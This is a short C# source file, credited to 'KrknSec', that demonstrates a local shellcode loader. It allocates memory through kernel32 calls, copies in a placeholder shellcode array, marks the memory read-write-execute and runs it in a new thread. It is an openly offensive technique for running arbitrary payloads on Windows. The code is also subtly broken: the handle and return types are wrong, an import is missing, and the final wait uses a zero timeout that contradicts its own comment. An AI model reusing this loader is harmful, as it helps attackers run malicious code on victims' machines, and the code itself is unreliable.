//-----------------------------------------------------------
// Author: KrknSec
// Description: Example of local shellcode execution in C#
//-----------------------------------------------------------

using System.Reflection.Metadata;
using System.Runtime.InteropServices;
using System.Windows;

namespace LocalPayloadExecution
{
    public class LocalPayloadExecution
    {
        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAlloc(IntPtr lpBaseAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualProtect(IntPtr lpBaseAddress, uint dwSize, uint flNewProtect, out IntPtr dwOldProtect);

        [DllImport("kernel32.dll")]
        public static extern Handle CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, uint lpThreadId);

        [DllImport("kernel32.dll")]
        public static extern IntPtr WaitForSingleObject(Handle hThread, uint dwMilliseconds);


        static void Main()
        {
            // Setup constants for API calls
            const uint MEM_COMMIT = 0x00001000;
            const uint MEM_RESERVE = 0x00002000;
            const uint PAGE_READWRITE = 0x04;
            const uint PAGE_EXECUTE_READWRITE = 0x40;

            // Shellcode
            byte[] buf = new byte[]
            {
                0xde,0xad,0xbe,0xef
            };

            // Allocate empty memory buffer
            IntPtr bufAddress = IntPtr.Zero;
            bufAddress = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

            // Copy shellcode to empty memory buffer
            Marshal.Copy(buf, 0, bufAddress, buf.Length);

            // Change page permissions to RWX
            IntPtr oldProtect = IntPtr.Zero;
            VirtualProtect(bufAddress, (uint)buf.Length, PAGE_EXECUTE_READWRITE, out oldProtect);

            // Execute shellcode in a new thread
            Handle hThread;
            hThread = CreateThread(IntPtr.Zero, 0, bufAddress, IntPtr.Zero, 0, 0);

            // Wait for shellcode to finish execution
            WaitForSingleObject(hThread, 0);
        }
    }
}
